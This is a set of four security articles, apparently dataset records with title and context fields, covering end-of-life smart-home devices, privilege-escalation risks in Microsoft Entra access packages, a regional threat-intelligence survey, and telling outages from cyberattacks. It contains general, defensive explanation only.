Context: That means it could be at risk of attacks that exploit newly found vulnerabilities
Full Text:
Security updates are vital for any software-based product. That is as true of your home PC as it is the myriad of smart devices you now use in your everyday life: from fitness trackers to smart TVs, phones and lights. If those updates are no longer produced by manufacturers because the product has been officially retired, it could spell trouble. The device usually carries on working, but every vulnerability found from then on stays open for good.

In France, hackers recently targeted unsupported IoT devices which controlled the temperature of supermarket refrigerators. By exploiting bugs that were not patched because the devices had reached end of life (EoL), the hackers increased the temperature inside, spoiling food and causing potentially tens of millions of euros’ worth of damage. Many of the controllers were end-of-life models that no longer received software or security updates, and one retail group expected losses of tens of millions of euros.

Those were commercial systems run by maintenance firms, not smart-home gadgets. But the weakness they shared is the same one an unsupported camera, router or TV box brings into your home.

Why it matters

You might not notice if your smart device stops updating. It may continue to work for a time. But critical functionality could eventually become unavailable. The user experience will degrade. And most importantly, it will no longer receive security updates.

When a device reaches end of life (EoL), the most important change is invisible: it stops receiving security updates. This means that any new vulnerabilities discovered in the product – by hackers or security researchers – will not get fixed. That provides an opportunity for bad actors to exploit them.

They could do this in order to:

Hijack your router to steal account passwords, bypass network security controls, and possibly redirect you to malicious/phishing sites

Compromise a smart device (e.g., a smart TV) and use it as a stepping stone into your IT network, enabling them to steal sensitive information stored on your computer or account passwords

Remotely control a smart door lock to access your property

Hijack a smart camera to eavesdrop on your family, possibly putting it in physical danger and/or giving them access to footage with which to blackmail you

Take over your smart devices and conscript them into a botnet to attack others. In March 2026, the US Department of Justice disrupted four IoT botnets comprised of at least three million devices, including DVRs, webcams, routers, and off-brand Android TV boxes. Back in 2023, ESET researchers found a kill switch that had been used to take down Mozi, one of the most prolific botnets out there.

Some smart devices are more at risk than others. No-name Android TV boxes may contain insecure services, pre-installed malware or outdated operating systems that are exposed to exploitation. In June 2025, the FBI warned that these and other devices were being used as part of the BADBOX 2.0 botnet.

What do I do when support ends?

If a smart product is no longer supported and therefore not receiving software updates, its functionality may start to degrade and it will become more exposed to security risks. For those reasons it’s best to replace it as soon as possible. That’s especially true of routers which are your digital front door to the smart home. Cameras and smart locks or home alarms should also be prioritized for replacement once they reach EoL.

However, sometimes it’s not even clear at the time of purchase how long a device will receive updates. A 2024 FTC study found that 89% of manufacturer web pages failed to disclose how long products would receive updates for. Your first port of call should be to record your model number and firmware version, and then check the manufacturer’s website for firmware release notes and EoL information. Be aware that the end of a warranty period doesn’t necessarily mean a vendor will stop providing updates. The details matter, as does the region in which you’re located.

The end of a warranty doesn’t necessarily mean the end of updates, and a device can lose support while still under warranty. Where you live can make the answer easier to find. In the UK, manufacturers of consumer smart products have had to publish a minimum security update period since April 2024. In the EU, the Cyber Resilience Act will require manufacturers to declare a support period, generally of at least five years, once its main obligations apply in December 2027.

How do I keep my smart home secure?

Consider the following to optimize the security of your smart home:

Start with the router: To slash the odds of your router getting hacked, ensure it’s on the latest firmware, and replace if it’s no longer supported. Also, replace default passwords with strong, unique credentials. Disable WPS and remote administration unless explicitly needed.

Segment smart devices from the rest of your IT: Create a separate guest network for all IoT devices so that hackers have a much harder time using them as a stepping stone into your PCs. Block connections from these devices to your trusted computers.

Switch on automatic updates: For devices that are still supported, auto updates will keep them current.

Protect your accounts: Use unique, strong passwords for each smart home account, stored in a password manager. Add an extra layer of security by switching on multi-factor authentication (MFA) where available.

Limit your risk exposure: Disable UPnP and port forwarding where appropriate. Steer clear of no-name Android boxes. Review your list of connected devices and router logs from time to time to check for anything suspicious.

FAQs

How long do smart home devices get security updates?

It depends. It’s always best to look up your model number and firmware release notes on the manufacturer’s website.

What happens when a smart device company shuts down its app or cloud?

Functionality will start to degrade and the device will no longer receive security updates. That means it could be at risk of attacks that exploit newly found vulnerabilities.

Is it safe to use a smart camera or router that no longer gets updates

It is unadvisable as these are critical devices which are at a greater risk of compromise if they’re not receiving security updates. Your home router could be hijacked to redirect you to malicious sites, steal your passwords, and eavesdrop on your communications. And if hackers access your smart camera, it could put your family in physical danger.

How do I know if my smart device is end of life?

Check your model details and firmware version with the manufacturer’s website. If there’s no notice and the last firmware update was years ago, assume it’s no longer supported.

Can hackers use my old smart TV or camera?

Yes, depending on the vulnerability they exploit, it may allow them to remotely view live or recorded footage from your camera, and any info stored on a smart TV. Both could be used to gain a foothold in your home IT network. And both could be compromised and conscripted into a botnet to attack others.

Are no-name Android TV boxes safe?

Many aren’t. They’re more likely to contain insecure services/apps, pre-installed malware or outdated operating systems that are exposed to exploitation.

Title: Age of Entitlement: Privileges in Entra's access packages
Context: Attackers may target access packages with these resources to elevate their privileges
Full Text:
This research was presented at Hybrid Identity Protection Conference (HIPConf) on September 10, 2026.

Key points

This post provides technical background about entitlement management and access packages in Microsoft Entra ID Governance.

Entitlement management lets administrators assign multiple permissions to users at once by using access packages. This simplifies permissions management throughout the user life cycle.

While entitlement management disallows privileged Entra roles like Global Administrator in access packages, role-assignable groups and roles like Exchange Administrator can still be included.

Attackers may target access packages with these resources to elevate their privileges.

Auditing permissions for entitlement management requires reviewing Entra ID's role assignments, as well as role assignments in ID Governance.

In this series of posts, we'll take an in-depth look at the configuration risks and security considerations that come with entitlement management.

Introduction

This post covers the fundamentals of Microsoft Entra ID Governance's entitlement management and outlines why an attacker may target your access packages for privilege escalation.

Entitlement management bundles access for internal users and guests, with options for life cycle management and approvals. While Microsoft states that access packages cannot contain any Entra-defined privileged roles, there are still many roles with permissions that can be used by an attacker to impact an Entra, Microsoft 365, or Azure environment through entitlement management.

This series will describe how everyday access package configurations within entitlement management can lead to scenarios where an attacker could elevate privileges. Future posts will cover scenarios where access packages can be misused and share some defensive measures to monitor and improve their security.

What is entitlement management?

Entitlement management (previously abbreviated as ELM) is a feature of Entra ID Governance to manage user and guest access through their time in an Entra tenant. This is sometimes called the "user life cycle," which encompasses how a user's access will change as they join a company, move between roles, and eventually depart the company.

By bundling required access into access packages, entitlement management allows assignment of multiple types of access such as group memberships, application roles, and SharePoint site access at once. This access can then be reviewed, renewed, and revoked together based on a user's roles.

Let's say a user joins our company. Based on their persona in IT, they receive access to the IT team's SharePoint site, various group memberships they need to manage devices, and the IT Teams channel. Entitlement management combines all these needs into one access package, making it simple to onboard the user to these memberships. Once granted, this access can be regularly reviewed.

When the user's team changes to cybersecurity, their access persona changes. The IT access package is removed, and they are instead assigned to a new security access package, with a different Teams channel and group memberships. Finally, all access is revoked through the access package when they leave the company.

Entitlement management versus PIM

Entitlement management may sound similar to privileged identity management (PIM), which helps users manage the approval, renewal, and revocation of privileged Entra roles. Both tools allow role assignment, approval, and continuous review of permissions; however, they serve different purposes.

PIM focuses on assignment of individual highly privileged Entra roles to users, not bundled access.

Entitlement management focuses on assignment of bundled access (groups of permissions) but disallows assignment of privileged Entra roles.

While entitlement management prevents direct assignment of privileged Entra roles, there are still ways an administrator or attacker may work around this. We'll cover more details on this later.

Architecture

To better understand how access packages are used and managed, let's look at the architecture of entitlement management.

Entitlement management is organized by catalogs that contain the resources a user may need access to. Resources are then added to access packages that bundle multiple resources into what's required for a user's role.

Once an access package is configured, users request or are added to access packages through requests that are evaluated by policies to determine any approvals required before access is granted. Target users may already exist in the Entra tenant, or they may come from an external tenant or preapproved connected organization, based on the policy's configuration.

After approval, the user is granted access to the resources in the requested access package.

Catalogs

Catalogs are the top-level container for entitlement management. They contain the resources that users need access to, as well as access packages that can grant users access to those resources.

In the Azure portal, new catalogs are added under "Catalogs" in the identity governance panel:

Resources

A resource is any item a user is granted access to through an access package. Resources are added into a catalog and included in access packages.

Resources can include:

Group membership and ownership

Azure Resource Manager (ARM) role assignments

Some Entra role assignments

Teams in Microsoft Teams

SharePoint sites

Application access

If E7 or Agent 365 licensing is in use, application permissions (appRoles) and delegated permissions (oauth2PermissionScopes) can also be added as resources and assigned to service principals (SPs) and agent identities through entitlement management.

Resources are added by selecting a catalog, then adding the target resource under "Add resources to catalog."

While entitlement management disallows direct assignment of privileged Entra roles, roles with privileges outside of Entra (roles not marked as "privileged") can still be assigned. Currently, this includes roles such as:

Billing Administrator

Exchange Administrator

Power Platform Administrator

Azure DevOps Administrator

Role-assignable groups that assign privileged roles to users (such as Global Administrator) can also be added as resources to a catalog. This means that while direct privileged role assignments are prevented, administrators might still use workarounds to add highly privileged roles into access packages. We will look into the security implications of this in our next post.

Access packages

Now that resources have been grouped into a catalog, they can be bundled based on a user persona and easily assigned to any users requiring that access.

Catalog resources are added to an access package along with their role status. This could include group membership or ownership, active or eligible membership in an Entra role, or specific Azure roles.

Once created, access packages follow policies to determine if a user is eligible for assignment.

Policies Policies control which users, groups, or guest users can be assigned to an access package. There may be required justifications, approvals, and life cycle workflow conditions in a policy to control who can request access, who approves it, and how long access lasts once it has been assigned. An access package can have multiple policies governing assignment.

Key policy settings include:

Who can get access: Can be specific groups or identities, all groups or identities, new or existing guest users, or restricted to administrative assignment

Who can request access: The user, their manager, or only administrators

Justification: If a justification is required from the requestor

Approval: If approval is required for requests, and who approves if so; up to three rounds of approval can be configured

Lifecycle: How long assignment to an access package lasts, whether users can extend their access, and whether regular access reviews are required

Once approved, the access package is assigned to the user, and all resource assignments in the access package are delivered to the user.

Management roles

How do you know who can control what in entitlement management? Currently, this is more complex to answer than in other access management tools within Entra ID. Both Entra roles and ID Governance roles must be reviewed to understand a user's rights in entitlement management.

An overview of key entitlement management roles is provided below. Full details on these permissions can be found in Microsoft's guide on the topic.

Unlike most permissions management features, entitlement management roles can be assigned outside of Entra's role assignments. This means you'll need to check two different areas to understand who can control your access policies: Entra role assignments and the ID Governance "Roles and administrators" section of each catalog in entitlement management.

Entra roles

Both the Global Administrator and Identity Governance Administrator Entra ID roles can fully control entitlement management. This includes creating new catalogs and access packages, adding resources, and controlling access package assignments and policies.

As the Global Administrator role holds full control of the Entra tenant, this role can assign any resource to a catalog. The Identity Governance Administrator role must own a resource in order to add it to a catalog, meaning that it cannot add Entra ID roles.

Entra ID custom roles with the microsoft.directory/entitlementManagement/allProperties/allTasks permission also hold full control of entitlement management.

These role assignments are found in the standard Entra "Roles and administrators" panel.

ID Governance roles

ID Governance has several roles outside of Entra ID that allow control of entitlement management. The most powerful of these is the Catalog Owner role, which can control the access packages, policies, and resources of any catalog they own. Additionally, the Catalog Creator automatically becomes a Catalog Owner over any catalog they have created.

Additional roles allow control of access packages (Access Package Manager), assignments (Access Package Assignment Manager), and external organizations that can be added to access package policies (Connected Organization Administrator).

Unlike Entra roles, ID Governance roles must be reviewed within the identity governance panel:

Catalog Creator and Connected Organization Administrator assignments are reviewed in the "Roles and administrators" section of entitlement management.

All other entitlement management roles are reviewed in the "Roles and administrators" section of each catalog, as seen below.

It's important to review these assignments since the access packages, assignments, and policies behind a catalog directly control user role assignments.

Application permissions

Along with permissions in Entra ID and ID Governance, application permissions—specifically, the EntitlementManagement.ReadWrite.All Microsoft Graph permission—can grant SPs full management access to entitlement management. Additional details on SPs and application permissions can be found in our previous post on the topic.

Risks of entitlement management

What's the impact of an entitlement management compromise? Depending on how your access packages are configured, a compromise can be severe.

We'll cover practical examples of this in our next post. In the meantime, let's walk through a conceptual overview of these concerns.

Impact While entitlement management can't directly assign privileged Entra roles, granting membership in role-assignable groups with privileged roles is still possible. Additionally, entitlement management can still assign Entra roles with permissions outside of Entra (such as Exchange), Azure roles, and sensitive data access within SharePoint and Teams.

Theory This creates several areas an attacker with control over entitlement management may target to elevate their privileges:

Methods Attackers may attempt several methods to target these resources, such as:

Directly escalating to an eligible access package of a compromised user

Creating new access packages within a catalog they control containing that catalog's privileged resources

Tampering with group memberships to gain eligibility to an access package

Conclusion

In this post, we looked at access packages in Entra's entitlement management and how their structure can lead to configurations that attackers may want to target. We also covered how permissions for entitlement management must be audited in Entra's role assignments and within ID Governance itself.

Our next post will explore the impact of access package compromises through examples using access package eligibility, ID Governance roles, and group membership tampering.

We're always eager to hear from you. If you have any questions, thoughts, or suggestions, send us a message at securitylabs@datadoghq.com, or open an issue. You can also subscribe to our newsletter or RSS feed.

Title: Regional Insights: 2027 State of Threat Intelligence
Context: Only 21% combine that external intelligence with their own internal telemetry in a single platform, where analysts can see which threats apply to their environment
Full Text:
Recorded Future’s 2027 State of Threat Intelligence report surveyed 768 security professionals worldwide on how they use threat intelligence today, how they apply AI to it, and where they plan to invest. The report presents the global findings. The regional executive summaries in this blog cover insights from the same survey, breaking data down by global region into dedicated briefs covering the specific conclusions for cybersecurity leaders in North America, EMEA, APJ, and LATAM. Start with your region to see how your peers are approaching threat intelligence, and read the others for a wider view.

North America (United States and Canada)

In North America, threat intelligence now informs decisions well beyond the security organization. Five teams consume it on average, and 85% of organizations surveyed have teams outside core security using it, including risk management (54%), fraud prevention (44%), and risk and compliance (44%). With intelligence supporting this many teams, 81% plan to invest more in the next 12 months. The challenge is getting the right intelligence to each of those teams in a form they can act on.

Doing that depends on how well intelligence comes together, and this is an ongoing effort for many programs. Most surveyed organizations (63%) draw on four or more intelligence vendors. Only 21% combine that external intelligence with their own internal telemetry in a single platform, where analysts can see which threats apply to their environment. Consolidation plans reflect this. Of the 76% planning to consolidate, the largest share are doing it to improve correlation across signals (40%), compared with only 8% who cite cost.

Moving intelligence from those sources to risk owners is also largely manual. 54% put intelligence into action manually across tools and processes. Among organizations sharing intelligence outside security, 38% rely on ad hoc messages or scheduled reports. Manual handoffs make it harder to see what risk owners did with the intelligence and whether it worked. While 98% measure program value, 28% track whether triggered actions were effective. Only 22% report closed-loop operationalization, where stakeholders act on intelligence, the results are validated, and those results inform the program’s priorities and collection.

AI is already part of this work for nearly all respondents (98%), and 60% use agents that take actions inside their intelligence tools. Leaders become more cautious as the stakes rise: comfort with letting AI act falls from 71% for summarization to 56% for enforcement actions. The leading barriers are lack of auditability (40%) and unproven accuracy (31%). 73% say intelligence regularly feeds their AI and automation systems or is a core input to them. That makes the quality and correlation of their intelligence a factor in how far they can trust AI to act.

Risk owners can come from procurement, legal, fraud, corporate security, or communications. Threat intelligence innovation means getting the intelligence to the right person to make decisions and take action based on that intelligence.

Rich LaTulip

North America Field CISO at Recorded Future

This summary draws on responses from 347 North American security professionals. They were part of a global survey of 768 that asked how organizations use threat intelligence, apply AI to it, and plan future investments.

The full report covers how intelligence is expanding across the business, what full visibility requires, and what stands between teams and proven impact.

Title: Outage or attack? Don’t let social media fill in the gaps
Context: AI can also help attackers find ways to exploit those vulnerabilities, putting pressure on security teams and consumers to install those patches as soon as possible
Full Text:
Your banking app won’t load. Someone posts that an airline is having computer problems. Then you see a screenshot showing trouble at a cloud provider.

By the time you’ve scrolled through a few more posts, someone is telling you to withdraw cash and prepare for a nationwide blackout.

That is quite a journey from an error message.

Recent technology disruptions have provided plenty of material for this kind of speculation. As CNN describes, real outages have become mixed up with exaggerated reports, unrelated events, and conspiracy theories about what might happen next. A routine emergency alert test was even folded into the narrative.

The outages are real and so is the inconvenience. The problem with reporting on computer failures is how quickly “the system is down” becomes “the system is under attack.”

Non-malicious causes include faulty software updates, configuration mistakes, equipment failures, power interruptions, and damaged cables. Cyberattacks can also disrupt services by overwhelming them with traffic or using ransomware to make systems unusable. From the outside, both can have you staring at much the same unhelpful error message.

There has been a lot of this recently. So much so that US Secretary of State Marco Rubio felt the need to dismiss widespread concerns that the recent tech outages in the past week are connected.

What actually went down

During an outage, users want immediate answers, but investigators need time to establish what’s gone wrong. In that information vacuum, speculation thrives.

Let’s have a look at some recent events:

European refrigeration attacks disrupted cooling systems at some businesses. Separately, monitoring systems at three French blood-storage sites were affected, but staff intervened before any blood products or samples were compromised.

Microsoft 365 outage was caused by a latent software defect in networking gateways. Several organizations lost a full day of work.

The FAA nationwide ground stop in the US due to a telecommunications failure that disrupted some air traffic control communications. The ground stop led to thousands of flight cancellations and delays are ongoing.

JPMorgan Chase and knock-on banking problems were caused by a software bug in an on-premises hardware system that slowed transaction processing. The issue delayed transactions; no lasting damage has been reported.

Optimizely Web Experimentation supply-chain attack served malicious code on 178 popular websites. The issue was fixed rapidly, but visitors may have been exposed to malicious code that infected their devices.

There is an important distinction between outages caused by bugs and those caused by attacks, but the cause alone doesn’t tell us how disruptive an incident will be.

A technical failure can cause enormous problems without an attacker being involved. And an attack can cause harm without producing a spectacular outage.

We should judge the cause and the consequences separately and not assume that the most visible disruption must be the most sinister.

How social media amplifies the alarm

These things happen all the time, and sometimes the impact is bigger than at other times. That’s not a reason to panic or assume they’re all part of a big conspiracy. The recent claims that the US was about to face a 90-day blackout are a good example.

Combined with social media algorithms, these incidents can quickly pull people who show an interest in these incidents into a vortex of bad news, making it feel as if the end of the world is just around the corner. A feed full of outages is not evidence of an approaching “bugalypse.” Before accepting that explanation, ask what connects the incidents beyond the fact that they appeared in your feed.

The 90-day blackout claim shows how quickly genuine events can be turned into evidence for a much bigger story. Social media users turned a routine US emergency alert test into a prediction of a 90-day blackout. Some posts pointed to the Microsoft outage and FAA ground stop as evidence that the disaster was already unfolding. Others misrepresented military contingency planning as advance knowledge of an imminent crisis.

In reality, the alert was a scheduled test, and the Federal Emergency Management Agency (FEMA) explicitly said there were “no blackouts, no secret emergencies.” The test went ahead without the predicted catastrophe. That is the problem: Genuine disruptions were being used to support a much larger claim for which there was no evidence.

Where AI fits in

AI is helping both software vendors and attackers find more bugs. That can mean larger updates from Microsoft, Google, and others, covering more vulnerabilities at a faster pace. AI can also help attackers find ways to exploit those vulnerabilities, putting pressure on security teams and consumers to install those patches as soon as possible.

Reports of misaligned AI agents can make it harder to see how AI can work both ways. That’s because the balance in cybersecurity isn’t where we want it to be yet. But in other fields, AI is helping scientists and researchers make large strides.

For an example of AI doing something genuinely useful, look at protein research. Determining a protein’s three-dimensional structure experimentally can take years. AlphaFold can often generate a useful prediction in minutes or hours, and its freely accessible database contains predictions for more than 200 million protein structures. Those models still need expert scrutiny and, where necessary, experimental validation. But they give researchers a starting point at a speed and scale that laboratory work alone could not match.

What to do

You can take cybersecurity seriously without treating every error message as a warning of impending disaster.

An outage deserves an explanation. An attack deserves investigation. Neither benefits from speculation presented as fact. Companies need to explain what they know, what they’re still investigating, and what customers should do. Those of us reporting on these incidents have a responsibility to make those distinctions clear and not connect the dots before we know whether there is a connection.

As readers, we can pause before sharing the next alarming prediction. Does it offer evidence, or just a collection of things that happened around the same time? Is there something useful we should do, or is someone simply giving us another reason to keep scrolling?

Keep your software updated. Protect your devices. Have a backup plan for services you depend on. But don’t let someone else’s take on things fill the gaps in what is known.

Scammers know more about you than you think.
